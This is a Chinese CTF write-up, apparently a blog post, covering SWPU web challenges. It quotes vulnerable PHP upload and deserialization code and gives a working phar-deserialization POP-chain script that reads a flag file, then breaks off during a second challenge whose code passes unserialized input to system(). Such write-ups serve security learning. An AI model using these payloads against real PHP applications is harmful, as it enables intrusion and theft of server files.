<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312211554502.png" alt="image-20240312211554502"></p>
<h1 id="swpuctf-2023-秋季新生赛nss_http_cheker">[SWPUCTF 2023 秋季新生赛]NSS_HTTP_CHEKER</h1>
<p>老生常谈的http协议知识：不赘述了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313160430851.png" alt="image-20240313160430851"></p>
<h1 id="swpu-2018simplephp">[SWPU 2018]SimplePHP</h1>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313161413778.png" alt="image-20240313161413778"></p>
<p>base.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
    <span class="hljs-title function_ invoke__">session_start</span>(); 
<span class="hljs-meta">?&gt;</span> 
&lt;!DOCTYPE html&gt; 
&lt;html&gt; 
&lt;head&gt; 
    &lt;meta charset=<span class="hljs-string">"utf-8"</span>&gt; 
    &lt;title&gt;web3&lt;/title&gt; 
    &lt;link rel=<span class="hljs-string">"stylesheet"</span> href=<span class="hljs-string">"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css"</span>&gt; 
    &lt;script src=<span class="hljs-string">"https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js"</span>&gt;&lt;/script&gt; 
    &lt;script src=<span class="hljs-string">"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"</span>&gt;&lt;/script&gt; 
&lt;/head&gt; 
&lt;body&gt; 
    &lt;nav <span class="hljs-class"><span class="hljs-keyword">class</span>="<span class="hljs-title">navbar</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">default</span>" <span class="hljs-title">role</span>="<span class="hljs-title">navigation</span>"&gt; </span>
<span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">container</span>-<span class="hljs-title">fluid</span>"&gt; </span>
<span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">navbar</span>-<span class="hljs-title">header</span>"&gt; </span>
<span class="hljs-class">            &lt;<span class="hljs-title">a</span> <span class="hljs-title">class</span>="<span class="hljs-title">navbar</span>-<span class="hljs-title">brand</span>" <span class="hljs-title">href</span>="<span class="hljs-title">index</span>.<span class="hljs-title">php</span>"&gt;首页&lt;/<span class="hljs-title">a</span>&gt; </span>
<span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt; </span>
<span class="hljs-class">            &lt;<span class="hljs-title">ul</span> <span class="hljs-title">class</span>="<span class="hljs-title">nav</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">nav</span> <span class="hljs-title">navbra</span>-<span class="hljs-title">toggle</span>"&gt; </span>
<span class="hljs-class">                &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>="<span class="hljs-title">active</span>"&gt;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>="<span class="hljs-title">file</span>.<span class="hljs-title">php</span>?<span class="hljs-title">file</span>="&gt;查看文件&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">li</span>&gt; </span>
<span class="hljs-class">                &lt;<span class="hljs-title">li</span>&gt;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>="<span class="hljs-title">upload_file</span>.<span class="hljs-title">php</span>"&gt;上传文件&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">li</span>&gt; </span>
<span class="hljs-class">            &lt;/<span class="hljs-title">ul</span>&gt; </span>
<span class="hljs-class">            &lt;<span class="hljs-title">ul</span> <span class="hljs-title">class</span>="<span class="hljs-title">nav</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">nav</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">right</span>"&gt; </span>
<span class="hljs-class">                &lt;<span class="hljs-title">li</span>&gt;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>="<span class="hljs-title">index</span>.<span class="hljs-title">php</span>"&gt;&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>="<span class="hljs-title">glyphicon</span> <span class="hljs-title">glyphicon</span>-<span class="hljs-title">user</span>"&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> $<span class="hljs-title">_SERVER</span>['<span class="hljs-title">REMOTE_ADDR</span>'];?&gt;&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">li</span>&gt; </span>
<span class="hljs-class">            &lt;/<span class="hljs-title">ul</span>&gt; </span>
<span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt; </span>
<span class="hljs-class">    &lt;/<span class="hljs-title">nav</span>&gt; </span>
<span class="hljs-class">&lt;/<span class="hljs-title">body</span>&gt; </span>
<span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt; </span>
<span class="hljs-class">&lt;!--<span class="hljs-title">flag</span> <span class="hljs-title">is</span> <span class="hljs-title">in</span> <span class="hljs-title">f1ag</span>.<span class="hljs-title">php</span>--&gt;</span></code></pre>
<p>upload_file.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-keyword">include</span> <span class="hljs-string">'function.php'</span>; 
<span class="hljs-title function_ invoke__">upload_file</span>(); 
<span class="hljs-meta">?&gt;</span> 
&lt;html&gt; 
&lt;head&gt; 
&lt;meta charest=<span class="hljs-string">"utf-8"</span>&gt; 
&lt;title&gt;文件上传&lt;/title&gt; 
&lt;/head&gt; 
&lt;body&gt; 
&lt;div align = <span class="hljs-string">"center"</span>&gt; 
        &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;/h1&gt; 
&lt;/div&gt; 
&lt;style&gt; 
    p{ margin:<span class="hljs-number">0</span> auto} 
&lt;/style&gt; 
&lt;div&gt; 
&lt;form action=<span class="hljs-string">"upload_file.php"</span> method=<span class="hljs-string">"post"</span> enctype=<span class="hljs-string">"multipart/form-data"</span>&gt; 
    &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">"file"</span>&gt;文件名:&lt;/label&gt; 
    &lt;input type=<span class="hljs-string">"file"</span> name=<span class="hljs-string">"file"</span> id=<span class="hljs-string">"file"</span>&gt;&lt;br&gt; 
    &lt;input type=<span class="hljs-string">"submit"</span> name=<span class="hljs-string">"submit"</span> value=<span class="hljs-string">"提交"</span>&gt; 
&lt;/div&gt; 

&lt;/script&gt; 
&lt;/body&gt; 
&lt;/html&gt;</code></pre>
<p>继续查看function.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-comment">//show_source(__FILE__); </span>
<span class="hljs-keyword">include</span> <span class="hljs-string">"base.php"</span>; 
<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Content-type: text/html;charset=utf-8"</span>); 
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_do</span>(<span class="hljs-params"></span>) </span>{ 
    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; 
    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">"REMOTE_ADDR"</span>]).<span class="hljs-string">".jpg"</span>;<span class="hljs-comment">//随机命名文件名 </span>
    <span class="hljs-comment">//mkdir("upload",0777); </span>
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">"upload/"</span> . <span class="hljs-variable">$filename</span>)) { <span class="hljs-comment">//应该是防止文件名重复，导致覆盖</span>
        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>); 
    } 
    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"tmp_name"</span>],<span class="hljs-string">"upload/"</span> . <span class="hljs-variable">$filename</span>); <span class="hljs-comment">//没毛病就上传</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;script type="text/javascript"&gt;alert("上传成功!");&lt;/script&gt;'</span>; 
} 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file</span>(<span class="hljs-params"></span>) </span>{ 
    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; 
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">upload_file_check</span>()) { 
        <span class="hljs-title function_ invoke__">upload_file_do</span>(); 
    } 
} 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_check</span>(<span class="hljs-params"></span>) </span>{ 
    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; 
    <span class="hljs-variable">$allowed_types</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">"gif"</span>,<span class="hljs-string">"jpeg"</span>,<span class="hljs-string">"jpg"</span>,<span class="hljs-string">"png"</span>); 
    <span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">"."</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>]); <span class="hljs-comment">//按照.符号将文件名分割开成数组</span>
    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$temp</span>); <span class="hljs-comment">//数组的指针指向数组的最后一个单元，这里就是后缀名</span>
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$extension</span>)) { 
        <span class="hljs-comment">//echo "&lt;h4&gt;请选择上传的文件:" . "&lt;h4/&gt;"; </span>
    } 
    <span class="hljs-keyword">else</span>{ 
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>,<span class="hljs-variable">$allowed_types</span>)) { <span class="hljs-comment">//白名单过滤</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; 
        } 
        <span class="hljs-keyword">else</span> { 
            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;script type="text/javascript"&gt;alert("Invalid file!");&lt;/script&gt;'</span>; 
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; 
        } 
    } 
} 
<span class="hljs-meta">?&gt;</span></code></pre>
<p>最后看一下查看文件：file.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"content-type:text/html;charset=utf-8"</span>);  
<span class="hljs-keyword">include</span> <span class="hljs-string">'function.php'</span>; 
<span class="hljs-keyword">include</span> <span class="hljs-string">'class.php'</span>; 
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'/var/www/html/'</span>); <span class="hljs-comment">//限制了目录</span>
<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>] ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>] : <span class="hljs-string">""</span>; <span class="hljs-comment">//查看指定文件</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>)) { 
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h2&gt;There is no file to show!&lt;h2/&gt;"</span>; 
} 
<span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(); 
<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) { <span class="hljs-comment">//如果文件存在，则调用show函数展示</span>
    <span class="hljs-variable">$show</span>-&gt;source = <span class="hljs-variable">$file</span>; 
    <span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">_show</span>(); 
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>)){ 
    <span class="hljs-keyword">die</span>(<span class="hljs-string">'file doesn\'t exists.'</span>); 
} 
<span class="hljs-meta">?&gt;</span></code></pre>
<p>再看一下class.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-variable">$name</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-variable language_">$this</span>-&gt;str;
        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">'str'</span>]-&gt;source;
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="hljs-variable">$this</span>-&gt;source)) {
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'hacker!'</span>);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);
        }
        
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="hljs-variable">$this</span>-&gt;source)) {
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"hacker~"</span>;
            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">"index.php"</span>;
        }
    }
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$key</span>);
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) {
            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable">$value</span> = <span class="hljs-string">"index.php"</span>;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$value</span>);
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;
    }
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>分析了一波上述文件代码，重点联动的就是上传文件和查看文件了，一般有这俩功能的站点，大概率就会有phar反序列化吧。</p>
<p>查看文件里面没啥说的，主要就是调用class.php里面的类方法。第一个注意的就是function.php里面对于上传的文件的处理：在这里首先限制了文件名后缀（且仅有这种限制），只修要修改后缀即可，没啥说的。</p>
<p>后面对于文件的处理，则是先取出完整的文件名称，例如exp.php经过<code>$_FILES["file"]["name"]</code>处理后依然是exp.php之后，拼接我们的ip地址，也就是在页面右上角处（如下图所示）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313171243987.png" alt="image-20240313171243987"></p>
<p>之后经过md5的加密组成文件名+jpg的方式，最后就是md5(拼接字符串).jpg，这也是我们最后访问的文件名。</p>
<p>接下来就是针对class的反序列化链子的分析了：这里不难分析，主要先定位到引起phar反序列化的点file_get_contents函数，这也就是最后读取flag的函数。</p>
<p>进一步分析不难发现这个链子：<code>C1e4r.__destruct-》Show.__toString-》Test.__get-》Test.get-》Test.file_get</code>，最后pop如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;
}

<span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">"exp.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">'&lt;?php __HALT_COMPILER();?&gt;'</span>); <span class="hljs-comment">//设置stub</span>
<span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>();
<span class="hljs-variable">$pop</span>-&gt;str = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();
<span class="hljs-variable">$pop</span>-&gt;str-&gt;str = <span class="hljs-keyword">array</span>(<span class="hljs-string">"str"</span>=&gt;<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>());
<span class="hljs-variable">$pop</span>-&gt;str-&gt;str[<span class="hljs-string">'str'</span>]-&gt;params = <span class="hljs-keyword">array</span>(<span class="hljs-string">"source"</span>=&gt;<span class="hljs-string">'/var/www/html/f1ag.php'</span>);
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$pop</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//添加要压缩的文件</span>
<span class="hljs-comment">//签名自动计算</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里我也陷入了一个误区就是对于调用_get魔术方法的理解。我以为<code>$this-&gt;str['str']-&gt;source</code>这一步的调用，是将source的参数值赋值给了get魔术方法的参数key，没想到看了PHP手册发现是直接将source参数名称复制给了key，这才有了后续的<code>array("source"=&gt;'/var/www/html/f1ag.php')</code>的产生。</p>
<p>最后生成的phar文件，修改后缀即可，最后file参数访问即可得到flag</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313170858005.png" alt="image-20240313170858005"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313170924146.png" alt="image-20240313170924146"></p>
<h1 id="swpuctf-2023-秋季新生赛uns3rialize">[SWPUCTF 2023 秋季新生赛]UnS3rialize</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NSS</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Congratulations!!!You have learned to construct a POP chain&lt;br/&gt;"</span>;
        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);
    }
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"W4keup!!!&lt;br/&gt;"</span>;
        <span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">"echo Welcome to NSSCTF"</span>;
    }
}


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$whoami</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$argv</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"what do you want?"</span>;
        <span class="hljs-variable">$want</span> = <span class="hljs-variable language_">$this</span>-&gt;whoami;
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$want</span>();
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sth</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Now you know how to use __toString&lt;br/&gt;There is more than one way to trigger"</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;sth-&gt;<span class="hljs-keyword">var</span>;
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span> = <span class="hljs-string">"nss"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">"ctf"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$notes</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$passwd</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;user = <span class="hljs-variable">$user</span>;
        <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-variable">$passwd</span>;
    }
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;user === <span class="hljs-string">"SWPU"</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">"NSS"</span>) {
                <span class="hljs-keyword">echo</span> <span class="hljs-string">"Now you know how to use __construct&lt;br/&gt;"</span>;
                <span class="hljs-keyword">echo</span> <span class="hljs-string">"your notes"</span>.<span class="hljs-variable language_">$this</span>-&gt;notes;
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"N0!"</span>);
        }
    }
}



<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'ser'</span>])) {
    <span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'ser'</span>]));
} <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Let's do some deserialization :)"</span>;
}
